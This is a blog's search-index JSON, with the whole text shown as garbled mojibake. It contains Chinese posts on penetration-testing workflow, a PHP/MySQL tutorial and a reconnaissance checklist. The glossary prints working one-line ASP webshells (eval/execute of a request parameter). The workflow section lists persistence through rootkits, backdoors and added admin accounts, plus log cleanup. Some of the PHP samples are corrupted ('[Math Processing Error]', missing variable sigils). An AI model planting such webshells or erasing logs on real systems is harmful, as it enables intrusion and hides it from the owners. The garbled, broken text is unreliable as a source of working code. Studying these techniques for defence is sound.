¹æ®å‰å‡ æ­¥çš„ç»“æœï¼Œè¿›è¡Œæ”»å‡» è·å–å†…éƒ¨ä¿¡æ¯ï¼šåŸºç¡€è®¾æ–½ï¼ˆç½‘ç»œè¿æ¥ï¼Œvpnï¼Œè·¯ç”±ï¼Œæ‹“æ‰‘ç­‰ï¼‰ è¿›ä¸€æ­¥æ¸—é€ï¼šå†…ç½‘å…¥ä¾µï¼Œæ•æ„Ÿç›®æ ‡ æŒç»­æ€§å­˜åœ¨ï¼šä¸€èˆ¬æˆ‘ä»¬å¯¹å®¢æˆ·åšæ¸—é€ä¸éœ€è¦ã€‚rookitï¼Œåé—¨ï¼Œæ·»åŠ ç®¡ç†è´¦å·ï¼Œé©»æ‰æ‰‹æ³•ç­‰ æ¸…ç†ç—•è¿¹ï¼šæ¸…ç†ç›¸å…³æ—¥å¿—ï¼ˆè®¿é—®ï¼Œæ“ä½œï¼‰ï¼Œä¸Šä¼ æ–‡ä»¶ç­‰ 2.7 ä¿¡æ¯æ•´ç† æ•´ç†æ¸—é€å·¥å…·ï¼šæ•´ç†æ¸—é€è¿‡ç¨‹ä¸­ç”¨åˆ°çš„ä»£ç ï¼Œpocï¼Œexpç­‰ æ•´ç†æ”¶é›†ä¿¡æ¯ï¼šæ•´ç†æ¸—é€è¿‡ç¨‹ä¸­æ”¶é›†åˆ°çš„ä¸€åˆ‡ä¿¡æ¯ æ•´ç†æ¼æ´ä¿¡æ¯ï¼šæ•´ç†æ¸—é€è¿‡ç¨‹ä¸­é‡åˆ°çš„å„ç§æ¼æ´ï¼Œå„ç§è„†å¼±ä½ç½®ä¿¡æ¯ ç›®çš„ï¼šä¸ºäº†æœ€åå½¢æˆæŠ¥å‘Šï¼Œå½¢æˆæµ‹è¯•ç»“æœä½¿ç”¨ã€‚ 2.8 å½¢æˆæŠ¥å‘Š æŒ‰éœ€æ•´ç†ï¼šæŒ‰ç…§ä¹‹å‰ç¬¬ä¸€æ­¥è·Ÿå®¢æˆ·ç¡®å®šå¥½çš„èŒƒå›´ï¼Œéœ€æ±‚æ¥æ•´ç†èµ„æ–™ï¼Œå¹¶å°†èµ„æ–™å½¢æˆæŠ¥å‘Š è¡¥å……ä»‹ç»ï¼šè¦å¯¹æ¼æ´æˆå› ï¼ŒéªŒè¯è¿‡ç¨‹å’Œå¸¦æ¥å±å®³è¿›è¡Œåˆ†æ ä¿®è¡¥å»ºè®®ï¼šå½“ç„¶è¦å¯¹æ‰€æœ‰äº§ç”Ÿçš„é—®é¢˜æå‡ºåˆç†é«˜æ•ˆå®‰å…¨çš„è§£å†³åŠæ³• 2.9 æµç¨‹æ€»ç»“ æ¸—é€æµ‹è¯•ç›¸å…³åè¯è§£æ 1.1 ä¸€äº›å‰ç½®çŸ¥è¯†ï¼ˆåŒ…å«ä½†ä¸é™äºï¼‰ è„šæœ¬ï¼ˆaspã€phpã€jspï¼‰ htmlï¼ˆcssã€jsã€htmlï¼‰ HTTPåè®® CMSï¼ˆB/Sï¼‰ 1.2 è‚‰é¸¡ è¢«é»‘å®¢å…¥ä¾µå¹¶è¢«é•¿æœŸé©»æ‰çš„è®¡ç®—æœºæˆ–æœåŠ¡å™¨ã€‚å¯ä»¥éšæ„æ§åˆ¶ï¼Œå¯ä»¥æ˜¯ä»»æ„ç³»ç»Ÿçš„è®¾å¤‡ï¼Œå¯¹è±¡å¯ä»¥æ˜¯ä¼ä¸šï¼Œä¸ªäººï¼Œæ”¿åºœç­‰ç­‰æ‰€æœ‰å•ä½ã€‚ 1.3 æŠ“é¸¡ åˆ©ç”¨ä½¿ç”¨é‡å¤§çš„ç¨‹åºçš„æ¼æ´ï¼Œä½¿ç”¨è‡ªåŠ¨åŒ–æ–¹å¼è·å–è‚‰é¸¡çš„è¡Œä¸ºã€‚ 1.4 Webshell é€šè¿‡Webå…¥ä¾µçš„ä¸€ç§è„šæœ¬å·¥å…·ï¼Œå¯ä»¥æ®æ­¤å¯¹ç½‘ç«™æœåŠ¡è¿›è¡Œä¸€å®šç¨‹åº¦çš„æ§åˆ¶ã€‚ 1.5 æ¼æ´ ç¡¬ä»¶ã€è½¯ä»¶ã€åè®®ç­‰ç­‰çš„å¯åˆ©ç”¨å®‰å…¨ç¼ºé™·ï¼Œå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå¯¹æ•°æ®è¿›è¡Œç¯¡æ”¹ï¼Œæ§åˆ¶ç­‰ã€‚ 1.6 æœ¨é©¬ é€šè¿‡å‘æœåŠ¡ç«¯æäº¤ä¸€å¥ç®€çŸ­çš„ä»£ç ï¼Œé…åˆæœ¬åœ°å®¢æˆ·ç«¯å®ç°webshellåŠŸèƒ½çš„æœ¨é©¬ã€‚ &lt;%eval request(â€œpassâ€)%&gt; &lt;%execute(request(â€œpassâ€))%&gt; request(â€œpassâ€)æ¥æ”¶å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼Œpassä¸ºæ‰§è¡Œå‘½ä»¤çš„å‚æ•°å€¼ã€‚ eval/execute å‡½æ•°æ‰§è¡Œå®¢æˆ·ç«¯å‘½ä»¤çš„å†…å®¹ 1.7 ææƒ æ“ä½œç³»ç»Ÿä½æƒé™çš„è´¦æˆ·å°†è‡ªå·±æå‡ä¸ºç®¡ç†å‘˜æƒé™ä½¿ç”¨çš„æ–¹æ³•ã€‚ 1.8 åé—¨ é»‘å®¢ä¸ºäº†å¯¹ä¸»æœºè¿›è¡Œé•¿æœŸçš„æ§åˆ¶ï¼Œåœ¨æœºå™¨ä¸Šç§æ¤çš„ä¸€æ®µç¨‹åºæˆ–ç•™ä¸‹çš„ä¸€ä¸ªâ€œå…¥å£â€ã€‚ 1.9 è·³æ¿ ä½¿ç”¨è‚‰é¸¡IPæ¥å®æ–½æ”»å‡»å…¶ä»–ç›®æ ‡ï¼Œä»¥ä¾¿æ›´å¥½çš„éšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯ã€‚ 1.10 æ—ç«™å…¥ä¾µ å³åŒæœåŠ¡å™¨ä¸‹çš„ç½‘ç«™å…¥ä¾µï¼Œå…¥ä¾µä¹‹åå¯ä»¥é€šè¿‡ææƒè·¨ç›®å½•ç­‰æ‰‹æ®µæ‹¿åˆ°ç›®æ ‡ç½‘ç«™çš„æƒé™ã€‚å¸¸è§çš„æ—ç«™æŸ¥è¯¢å·¥å…·æœ‰ï¼šWebRobotã€å¾¡å‰‘ã€æ˜å°å­å’Œwebåœ¨çº¿æŸ¥è¯¢ç­‰ 1.11 C**æ®µå…¥ä¾µ** å³åŒCæ®µä¸‹æœåŠ¡å™¨å…¥ä¾µã€‚å¦‚ç›®æ ‡ipä¸º192.168.180.253 å…¥ä¾µ192.168.180.*çš„ä»»æ„ä¸€å°æœºå™¨ï¼Œç„¶ååˆ©ç”¨ä¸€äº›é»‘å®¢å·¥å…·å—…æ¢è·å–åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„å„ç§ä¿¡æ¯ã€‚å¸¸ç”¨çš„å·¥å…·æœ‰ï¼šåœ¨windowsä¸‹æœ‰Cainï¼Œåœ¨UNIXç¯å¢ƒä¸‹æœ‰Sniffit, Snoop, Tcpdump, Dsniff ç­‰ã€‚ 1.12 é»‘ç›’æµ‹è¯• åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹ï¼Œæ¨¡æ‹Ÿé»‘å®¢çš„æ”»å‡»æ–¹æ³•å’Œæ€ç»´æ–¹å¼ï¼Œæ¥è¯„ä¼°è®¡ç®—æœºç½‘ç»œç³»ç»Ÿå¯èƒ½å­˜åœ¨çš„å®‰å…¨é£é™©ã€‚ é»‘ç›’æµ‹è¯•ä¸åŒäºé»‘å®¢å…¥ä¾µï¼Œå¹¶ä¸ç­‰äºé»‘ç«™ã€‚é»‘ç›’æµ‹è¯•è€ƒéªŒçš„æ˜¯ç»¼åˆçš„èƒ½åŠ›ï¼ˆOSã€Datebaseã€Scriptã€codeã€æ€è·¯ã€ç¤¾å·¥ï¼‰ã€‚æ€è·¯ä¸ç»éªŒç§¯ç´¯å¾€å¾€å†³å®šæˆè´¥ã€‚ 1.13 ç™½ç›’æµ‹è¯• ç›¸å¯¹é»‘ç›’æµ‹è¯•ï¼Œç™½ç›’æµ‹è¯•åŸºæœ¬æ˜¯ä»å†…éƒ¨å‘èµ·ã€‚ç™½ç›’æµ‹è¯•ä¸é»‘ç›’æµ‹è¯•æ°æ°ç›¸åï¼Œæµ‹è¯•è€…å¯ä»¥é€šè¿‡æ­£å¸¸æ¸ é“å‘è¢«æµ‹å•ä½å–å¾—å„ç§èµ„æ–™ï¼ŒåŒ…æ‹¬ç½‘ç»œæ‹“æ‰‘ã€å‘˜å·¥èµ„æ–™ç”šè‡³ç½‘ç«™æˆ–å…¶å®ƒç¨‹åºçš„ä»£ç ç‰‡æ–­ï¼Œä¹Ÿèƒ½å¤Ÿä¸å•ä½çš„å…¶å®ƒå‘˜å·¥ï¼ˆé”€å”®ã€ç¨‹åºå‘˜ã€ç®¡ç†è€…â€¦â€¦ï¼‰è¿›è¡Œé¢å¯¹é¢çš„æ²Ÿé€šã€‚ 1.13 é»‘ç™½ç›’çš„å¦ä¸€ç§è¯´æ³• çŸ¥é“æºä»£ç å’Œä¸çŸ¥é“æºä»£ç çš„æ¸—é€æµ‹è¯•ã€‚è¿™æ—¶ï¼Œé»‘ç›’æµ‹è¯•è¿˜æ˜¯ä¼ ç»Ÿçš„æ¸—é€æµ‹è¯•ï¼Œè€Œç™½ç›’æµ‹è¯•å°±åå‘äºä»£ç å®¡è®¡ã€‚ 1.14 APT**æ”»å‡»** Advanced Persistent Threatï¼Œé«˜çº§å¯æŒç»­æ€§æ”»å‡»ï¼Œæ˜¯æŒ‡ç»„ç»‡(ç‰¹åˆ«æ˜¯æ”¿åºœ)æˆ–è€…å°å›¢ä½“åˆ©ç”¨å…ˆè¿›çš„æ”»å‡»æ‰‹æ®µå¯¹ç‰¹å®šç›®æ ‡è¿›è¡Œé•¿æœŸæŒç»­æ€§ç½‘ç»œæ”»å‡»çš„æ”»å‡»å½¢å¼ã€‚ 1.æå¼ºçš„éšè”½æ€§ 2.æ½œä¼æœŸé•¿ï¼ŒæŒç»­æ€§å¼º 3.ç›®æ ‡æ€§å¼º","categories":[],"tags":[],"keywords":[]},{"title":"PHPåŠmysqlæ•°æ®åº“","slug":"PHPåŠmysqlæ•°æ®åº“","date":"2019-12-18T12:02:01.000Z","updated":"2020-09-20T09:02:41.712Z","comments":true,"path":"2019/12/18/PHPåŠmysqlæ•°æ®åº“/","link":"","permalink":"https://zhangyanlady.github.io/2019/12/18/PHP%E5%8F%8Amysql%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"mysqlä¸€ã€æ¦‚è¿°1.æ•°æ®åº“çš„äº”ä¸ªåŸºæœ¬å•ä½ï¼šæ•°æ®åº“æœåŠ¡å™¨ï¼Œæ•°æ®åº“ï¼Œæ•°æ®è¡¨ï¼Œå­—æ®µï¼ˆæ•°æ®åˆ—ï¼‰ï¼Œæ•°æ®è¡Œ 2.æ•°æ®åº“ç™»å½•å‘½ä»¤ï¼šmysql -h localhost -u root -p (-h è¿æ¥åï¼Œæœ¬åœ°è¿æ¥å¯ä»¥ä¸å†™ï¼Œ-u ç”¨æˆ·åï¼Œ -p ç”¨å¯†ç çš„æ–¹å¼ç™»å½•) 3.æ•°æ®åº“å¼•æ“ï¼šMyISAMä¸nnoDBåŒºåˆ«ï¼š MyISAMï¼šèƒ½æ›´å¥½çš„çš„ç”¨äºæŸ¥æ‰¾ï¼Œä¸æ”¯æŒäº‹åŠ¡ã€‚ nnoDBï¼šæ›´å¥½çš„ç”¨äºå¢åˆ æ”¹ï¼Œæ”¯æŒäº‹åŠ¡ã€‚ è¯¦ç»† ï¼šhttps://www.cnblogs.com/vicenteforever/articles/1613119.html 4.å¸¸ç”¨çš„æ•°æ®åº“ç¼–ç  gbkâ€“chineseâ€“ci ç®€ä½“ä¸­æ–‡ï¼Œä¸åŒºåˆ†å¤§å°ã€‚ uft8â€“generalä¸åŒºåˆ†å¤§å°å†™ã€‚ äºŒã€æ•°æ®åº“å®šä¹‰è¯­å¥ï¼ˆDDLï¼‰ åˆ›å»ºæ•°æ®åº“ create database æ•°æ®åº“åç§°;create database books; æŸ¥çœ‹æ•°æ®åº“ show data åˆ é™¤æ•°æ®åº“ â€‹ drop database user; åˆ›å»ºæ•°æ®è¡¨ use user; //ä½¿ç”¨æ•°æ®åº“create table book (id int(20) primary key,bookname varchar(255),type varchar(255),information varchar(255))æ³¨ï¼šæœ€åæ²¡æœ‰â€œ,â€,primary key ä¸ºä¸»é”® æŸ¥çœ‹æœ¬æ•°æ®åº“æ‰€æœ‰æ•°æ®è¡¨ show tables; æŸ¥çœ‹è¡¨ç»“æ„ desc user; ä¿®æ”¹æ•°æ®è¡¨ å‘æ•°æ®è¡¨ä¸­æ·»åŠ æ–°å­—æ®µï¼šalter table book add column ISDN int(20); å‘æ•°æ®è¡¨ä¸­åˆ é™¤å­—æ®µï¼šalter table book drop column ISDN; ä¿®æ”¹æ•°æ®è¡¨ä¸­å­—æ®µçš„ç±»å‹ï¼šalter table book modify column type int(200); ä¿®æ”¹æ•°æ®è¡¨ä¸­å­—æ®µçš„åç§°åŠç±»å‹ï¼šalter table book change column type phone int(25); åˆ é™¤æ•°æ®è¡¨ drop table book; æŸ¥çœ‹æ•°æ®åº“åˆ›å»ºè¿‡ç¨‹ show create database books; æŸ¥çœ‹è¡¨åˆ›å»ºæºç ï¼š show create table userï¼› ä¸‰ã€æ•°æ®åº“å®šä¹‰è¯­è¨€ï¼ˆDMLï¼‰1.å‘æ•°æ®è¡¨ä¸­æ’å…¥æ•°æ®insert into user (id,username,password,birthday) values(5,â€qiqiâ€,123456,â€1998.05.26â€); 2.ä¿®æ”¹è¡¨ä¸­çš„æ•°æ®update user set username=â€zhaoâ€ where id=5; 3.åˆ é™¤è¡¨ä¸­çš„æ•°æ®åˆ é™¤æ‰€æœ‰æ•°æ®ï¼šdelete from userï¼› å››ã€æƒé™æ“ä½œ æˆäºˆæƒé™ grant æƒé™ on åº“.è¡¨ toâ€™ç”¨æˆ·â€˜@â€™ä¸»æœºâ€™ identified by â€˜å¯†ç â€™;ç¤ºä¾‹ grant select, inserton test.* to â€˜liwenkaiâ€™@â€™localhostâ€™ identified by â€˜4311â€™;ç¤ºä¾‹è¯´æ˜ ç»™äºˆliwenkaiç”¨æˆ·ï¼Œåœ¨æœ¬æœºè¿æ¥teståº“æ‰€æœ‰è¡¨çš„æƒé™ã€‚æ“ä½œçš„è¿™äº›è¡¨å…·æœ‰æŸ¥è¯¢å’Œå†™å…¥æƒé™ã€‚ åˆ é™¤æƒé™ åŸºæœ¬è¯­æ³•ï¼šrevoke æƒé™ on åº“.è¡¨ from â€˜ç”¨æˆ·â€˜@â€™ä¸»æœºâ€™;ç¤ºä¾‹ï¼šrevoke select ,insert on test.* from â€˜liwenkaiâ€™@â€™localhostâ€™; phpä¸€ã€åŸºæœ¬è¯­æ³•1.å®šä¹‰ ï¼ˆ$+æœ‰æ„ä¹‰çš„åç§°ï¼‰$shuåˆå§‹åŒ– $shu=10;//å¼€å§‹å®šä¹‰çš„æ—¶å€™èµ‹å€¼ 2.å¯å˜å˜é‡$$+æœ‰æ„ä¹‰åç§°ï¼› 1234567891011&lt;?p&#x2F;&#x2F;å¯å˜å˜é‡$shu&#x3D;&#39;biao&#39;;$biao&#x3D;&quot;é¼ æ ‡&quot;;echo $$shu;?&gt; 3.æ³¨é‡Šå•è¡Œæ³¨é‡Šï¼š//å•è¡Œæ³¨é‡Šï¼š#å¤šè¡Œæ³¨é‡Šï¼š/* */ 4.æ•°æ®ç±»å‹æ•´å‹ï¼š 12345678910111213141516171819202122&lt;?php&#x2F;&#x2F;æ•´æ•°ç±»å‹ 10è¿›åˆ¶ï¼Œ8è¿›åˆ¶ï¼Œ16è¿›åˆ¶int$int&#x3D;1000;echo $int;echo &#39;&lt;br&gt;&#39;;$int8&#x3D;01534;echo $int8;echo &#39;&lt;br&gt;&#39;;$int16&#x3D;0x1927fa;echo $int16;?&gt; boolç±»å‹ï¼šåªæœ‰ä¸¤ä¸ªè¿”å›å€¼ï¼štrue ,false 1234567891011121314&lt;?php&#x2F;&#x2F;å¸ƒå°”ç±»å‹bool$bool&#x3D;true;echo $bool;echo &#39;&lt;br&gt;&#39;;var_dump($bool);?&gt; strå­—ç¬¦ä¸²ç±»å‹ï¼š 12345678910111213141516&lt;?php&#x2F;&#x2F;å­—ç¬¦ä¸²ç±»å‹strstr1&#x3D;&#39;name,let\\&#39;s go&#39;;&#x2F;&#x2F;å•å¼•å·ä¸­æœ‰ç¬¦å·ï¼Œä¼šè¢«åŸæ ·è¾“å‡ºvar_dump($str1);echo &#39;&lt;br&gt;&#39;;str2&#x3D;&quot;name,let&#39;s go&quot;;&#x2F;&#x2F;åŒå¼•å·ä¸­çš„ç¬¦å·ï¼Œä¸ä¼šè¢«åŸæ ·è¾“å‡ºï¼Œæ˜¯å˜é‡çš„å¼€å§‹var_dump($str2);?&gt; 5.ç®—æ•°è¿ç®—ç¬¦ 123456789101112131415161718&lt;?php&#x2F;&#x2F;ç®—æ•°è¿ç®—ç¬¦[Math Processing Error]x&#x3D;5;y&#x3D;10;echo [Math Processing Error]x+y;echo &#39;&lt;br&gt;&#39;;echo [Math Processing Error]x+&#x3D;y;&#x2F;&#x2F;x&#x3D;15echo &#39;&lt;br&gt;&#39;; echo [Math Processing Error]x++;&#x2F;&#x2F;x++æ˜¯å…ˆè¾“å‡ºå†ç›¸åŠ  echo &#39;&lt;br&gt;&#39;;echo ++[Math Processing Error]x; &#x2F;&#x2F;++xæ˜¯å…ˆç›¸åŠ åœ¨è¾“å‡ºecho &#39;&lt;br&gt;&#39;;echo [Math Processing Error]y % x;?&gt; äºŒã€æµç¨‹æ§åˆ¶1.if else é€‰æ‹©ç»“æ„ 123456789101112131415161718&lt;?php&#x2F;&#x2F;ifè¯­å¥$po&#x3D;true;if($po)&#123; echo &#39;æˆ‘æ„¿æ„å»å­¦ä¹ ï¼&#39;; &#125;else&#123; echo &#39;æˆ‘ä¸æ„¿æ„å»å­¦ä¹ ï¼&#39;;&#125; ?&gt; 2.switch case è¯­å¥ 12345678910111213141516171819202122232425262728293031323334&lt;?php$tool&#x3D;rand(1,6);&#x2F;&#x2F;äº§ç”Ÿéšæœºæ•°çš„å‡½æ•°switch($tool)&#123;case 1:echo &#39;è‡ªå·±å¼€è½¦&#39;;break;case 2:echo &#39;éª‘è‡ªè¡Œè½¦&#39;;break; case 3: &#x2F;&#x2F;é€‰é¡¹å—echo &#39;å¼€å°æ±½è½¦&#39;;break; defined: &#x2F;&#x2F;éƒ½ä¸é€‰çš„æ—¶å€™æ‰§è¡Œçš„è¯­å¥å—echo &#39;ä¸å›å®¶&#39;;&#125;?&gt;&#x2F;&#x2F;æ ¹æ®äº§ç”Ÿçš„éšæœºæ•°ï¼Œé€‰æ‹©ä¸åŒæ¨¡å— 3.whileå¾ªç¯è¯­å¥ 12345678910111213141516171819202122232425262728&lt;?php&#x2F;&#x2F; whileå¾ªç¯è¯­å¥$rom&#x3D;0;while($rom &lt;5)&#123; if($rom&#x3D;&#x3D;0)&#123; echo &#39;æˆ‘åˆšè¿›å…¥å¾ªç¯&lt;br&gt;&#39;; &#125; else&#123; echo &#39;æˆ‘å¾ªç¯äº†&#39;.$rom.&#39;æ¬¡&lt;br&gt;&#39;; &#125; $rom++;&#125;echo &#39;whileå¾ªç¯ç»“æŸäº†&#39;;?&gt; 4.forå¾ªç¯è¯­å¥ 1234567891011121314&lt;?php&#x2F;&#x2F;forå¾ªç¯,foreach(æ•°ç»„1 as $value) å°†æ•°ç»„èµ‹å€¼ç»™valuefor (i&#x3D;1;i&lt;5;$i++)&#123; echo &#39;è¿™æ˜¯ç¬¬&#39;.$i.&#39;æ¬¡&lt;br&gt;&#39;;&#125;echo &#39;forå¾ªç¯ç»“æŸ&#39;;?&gt; 5.gotoè¯­å¥gotoè¯­å¥è·³è½¬ä¹‹åä¼šåœæ­¢å‘ä¸‹æ‰§è¡Œï¼Œç›´æ¥æ‰§è¡Œè·³è½¬åˆ°çš„è¯­å¥ä¸­ç»§ç»­æ‰§è¡Œ 123456789101112131415161718&lt;?phpgoto wan;echo &#39;æˆ‘å°±æ˜¯æˆ‘ï¼Œæˆ‘å–œæ¬¢æˆ‘è‡ªå·±&#39;;wan:echo &#39;ä½ ä¸èƒ½é‚£ä¹ˆè‡ªç§,ä½ è¦çˆ±å¤§å®¶ï¼&lt;br&gt;&#39;;goto gril;gril:echo &#39;ä½ è¿˜è¦çˆ±ä½ çš„å¥³å­©!&#39;;?&gt; ä¸‰ã€å‡½æ•°1.å®šä¹‰ 1234567891011121314&lt;?php&#x2F;&#x2F;åŸºæœ¬å‡½æ•°è¯­æ³•function love(i,l&#x3D;14)&#123; echo &#39;i love you &#39;.i.l;&#125;love(13);?&gt; 2.å¸¸ç”¨å‡½æ•°****æ•°å­—å‡½æ•° abs() ç»å¯¹å€¼å‡½æ•°pow(-1,20) è¿”å›-1çš„20æ¬¡æ–¹min(1,2,3,4,5,6) æ±‚è¿™äº›æ•°çš„æœ€å°å€¼max() è¿”å›æœ€å¤§å€¼pi() åœ†å‘¨ç‡å€¼count() è®¡ç®—æ•°é‡ ****å­—ç¬¦ä¸²å‡½æ•°count_chars() ç»Ÿè®¡å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—æ¯ ****æ—¥æœŸå‡½æ•° 12345678910111213141516171819202122232425262728&lt;?php$mytime &#x3D; getdate();echo &quot;å¹´ :&quot;.$mytime[&#39;year&#39;].&quot;\\n&quot;;echo &quot;æœˆ :&quot;.$mytime[&#39;mon&#39;].&quot;\\n&quot;;echo &quot;æ—¥ :&quot;.$mytime[&#39;mday&#39;].&quot;\\n&quot;;echo &quot;æ—¶ :&quot;.$mytime[&#39;hours&#39;].&quot;\\n&quot;;echo &quot;åˆ† :&quot;.$mytime[&#39;minutes&#39;].&quot;\\n&quot;;echo &quot;ç§’ :&quot;.$mytime[&#39;seconds&#39;].&quot;&lt;br&gt;&quot;;echo &quot;ä¸€ä¸ªå°æ—¶ä¸­çš„ç¬¬å‡ é’Ÿ :&quot;.$mytime[&#39;minutes&#39;].&quot;\\n&quot;;echo &quot;è¿™æ˜¯ä¸€åˆ†é’Ÿçš„ç¬¬å‡ ç§’ :&quot;.$mytime[&#39;seconds&#39;].&quot;\\n&quot;;echo &quot;æ˜ŸæœŸåç§° :&quot;.$mytime[&#39;weekday&#39;].&quot;\\n&quot;;echo &quot;æœˆä»½åç§° :&quot;.$mytime[&#39;month&#39;].&quot;\\n&quot;;echo &quot;æ—¶é—´æˆ³ :&quot;.$mytime[0].&quot;\\n&quot;;?&gt; å››ã€æ•°ç»„ä¸æ•°æ®ç»“æ„12345678910111213141516171819202122232425262728293031323334&lt;?php&#x2F;&#x2F;æ•°ç»„ä¸æ•°æ®ç»“æ„$shu&#x3D;array(1,1.5,20,true,&#39;æˆ‘å°±æ˜¯æˆ‘ï¼Œæˆ‘çˆ±æˆ‘&#39;);var_dump($shu);echo &#39;&lt;br&gt;&#39;;&#x2F;&#x2F;åŒºåˆ«echo $shu.&#39;&lt;br&gt;&#39;;$num&#x3D;array(1,2,3,4,5,6,7,8,9,10);echo $num[0].&#39;&lt;br&gt;&#39;;&#x2F;&#x2F;å•ä¸ªè¾“å‡ºfor (i&#x3D;0;i&lt;9;$i++)&#123;&#x2F;&#x2F;éå†æ•°ç»„ echo num[i].&#39;&lt;br&gt;&#39;;&#125;&#x2F;&#x2F;æ•°ç»„éå†å…ƒç´ $mingren &#x3D; array(&quot;é‚“è¶…&quot;, &quot;é»„æ™“æ˜&quot;, &quot;å®æ³½æ¶›&quot;, &quot;é’Ÿæ±‰è‰¯&quot;);dc &#x3D; array_shift(mingren);echo $dc .&#39;&lt;br &#x2F;&gt;&#39;;print_r($mingren);?&gt; äº”ã€æ­£åˆ™è¡¨è¾¾å¼123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php&#x2F;&#x2F;php æ­£åˆ™è¡¨è¾¾å¼$zz &#x3D; &#39;&#x2F;w.+q&#x2F;&#39;;&#x2F;&#x2F;&#39;&#x2F;w.+q&#x2F;U&#39;ä¸ºæ‡’æƒ°æ¨¡å¼ï¼Œè¾“å‡ºç»“æœä¸ºw_q$string &#x3D; &#39;sssssw__qqqqqqaaaaaa&#39;;if(preg_match(zz, string, $matches))&#123; echo &#39;åŒ¹é…åˆ°äº†ï¼Œç»“æœä¸ºï¼š&#39;; var_dump($matches); print_r( &#39;&lt;br&gt;&#39;.$matches);&#125;else&#123;&#125;?&gt;&lt;hr&gt;&#x2F;&#x2F;åˆ†å‰²çº¿ç¬¦å·&lt;?php$subject &#x3D; &quot;test__123123123&quot;;preg_match(&#39;&#x2F;test.+123&#x2F;&#39;, subject, matches); &#x2F;&#x2F;è´ªå©ªæ¨¡å¼ var_dump($matches);preg_match(&#39;&#x2F;test.+123&#x2F;U&#39;, subject, matches); &#x2F;&#x2F;æ‡’æƒ°æ¨¡å¼var_dump($matches);preg_filter(&#39;&#x2F;test.+123&#x2F;&#39;,subject,matches);var_dump($matches);&#x2F;&#x2F;åŒ¹é…ç»“æœä¸æ‡’æƒ°æ¨¡å¼ä¸€æ ·ï¼Œ?&gt; åˆ é™¤è¡¨ä¸­çš„æŸä¸ªå­—æ®µï¼šdelete from user where id=5ï¼›","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://zhangyanlady.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://zhangyanlady.github.io/tags/%E5%BC%80%E5%8F%91/"},{"name":"web","slug":"web","permalink":"https://zhangyanlady.github.io/tags/web/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"https://zhangyanlady.github.io/tags/%E9%9D%A2%E8%AF%95/"}],"keywords":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://zhangyanlady.github.io/categories/%E5%BC%80%E5%8F%91/"}]},{"title":"æ¸—é€æ€è·¯","slug":"æ¸—é€æ€è·¯","date":"2019-11-29T15:26:36.000Z","updated":"2020-09-20T08:58:09.213Z","comments":true,"path":"2019/11/29/æ¸—é€æ€è·¯/","link":"","permalink":"https://zhangyanlady.github.io/2019/11/29/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/","excerpt":"","text":"æ³¨æ„ï¼šåˆ†å‰²çº¿ä¸‹é¢å†…å®¹æ¥è‡ªçŸ¥ä¹ï¼ŒåŸæ–‡æ¥è‡ªIæ˜¥ç§‹ ç¬¬ä¸€ï¼Œæœé›†ç›®æ ‡ç½‘ç«™ä¿¡æ¯ã€‚windowsä¸‹ç”¨çˆ±ç«™whoiså»æŸ¥ç›¸å…³ä¿¡æ¯ã€‚kaliç”¨whois + urlå»æŸ¥ã€‚ ç¬¬äºŒï¼ŒæŸ¥æ—ç«™ã€‚ ç¬¬ä¸‰ï¼ŒæŸ¥ç›®æ ‡ç½‘ç«™çœŸå®IPï¼Œæœ‰çš„ç½‘ç«™æœ‰CDNï¼Œæ— æ³•çŸ¥é“çœŸå®IPï¼Œæ‰€ä»¥ï¼Œåˆ©ç”¨å¤špingå»åˆ¤æ–­åˆ†æçœŸå®IPã€‚ ç¬¬å››ï¼ŒçŸ¥é“çœŸå®IPï¼Œå°±å¯ä»¥ç«¯å£æ‰«æï¼Œçœ‹ä¸€äº›æ•æ„Ÿç«¯å£ã€‚è¦ä¹ˆç«¯å£çˆ†ç ´ï¼Œè¦ä¹ˆå—…æ¢ã€‚ 1)ä¿¡æ¯æ”¶é›†ï¼Œ 1ï¼Œè·å–åŸŸåçš„whoisä¿¡æ¯,è·å–æ³¨å†Œè€…é‚®ç®±å§“åç”µè¯ç­‰ã€‚ 2ï¼ŒæŸ¥è¯¢æœåŠ¡å™¨æ—ç«™ä»¥åŠå­åŸŸåç«™ç‚¹ï¼Œå› ä¸ºä¸»ç«™ä¸€èˆ¬æ¯”è¾ƒéš¾ï¼Œæ‰€ä»¥å…ˆçœ‹çœ‹æ—ç«™æœ‰æ²¡æœ‰é€šç”¨æ€§çš„cmsæˆ–è€…å…¶ä»–æ¼æ´ã€‚ 3ï¼ŒæŸ¥çœ‹æœåŠ¡å™¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œwebä¸­é—´ä»¶ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨å·²çŸ¥çš„æ¼æ´ï¼Œæ¯”å¦‚IISï¼ŒAPACHE,NGINXçš„è§£ææ¼æ´ 4ï¼ŒæŸ¥çœ‹IPï¼Œè¿›è¡ŒIPåœ°å€ç«¯å£æ‰«æï¼Œå¯¹å“åº”çš„ç«¯å£è¿›è¡Œæ¼æ´æ¢æµ‹ï¼Œæ¯”å¦‚ rsync,å¿ƒè„å‡ºè¡€ï¼Œmysql,ftp,sshå¼±å£ä»¤ç­‰ã€‚ 5ï¼Œæ‰«æç½‘ç«™ç›®å½•ç»“æ„ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥éå†ç›®å½•ï¼Œæˆ–è€…æ•æ„Ÿæ–‡ä»¶æ³„æ¼ï¼Œæ¯”å¦‚phpæ¢é’ˆ 6ï¼Œgoogle hack 